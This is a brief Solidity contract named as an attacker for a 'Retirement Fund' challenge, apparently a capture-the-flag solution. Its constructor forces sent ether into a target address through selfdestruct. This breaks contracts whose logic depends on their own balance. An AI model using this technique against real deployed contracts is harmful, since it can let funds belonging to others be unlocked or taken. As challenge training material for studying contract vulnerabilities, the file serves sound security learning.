pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

contract RetirementFundChallengeAttacker {
    constructor(address payable addr) payable {
        require(addr != address(0), "Invalid address");
        require(msg.value > 0, "No funds.");
        selfdestruct(addr);
    }
}
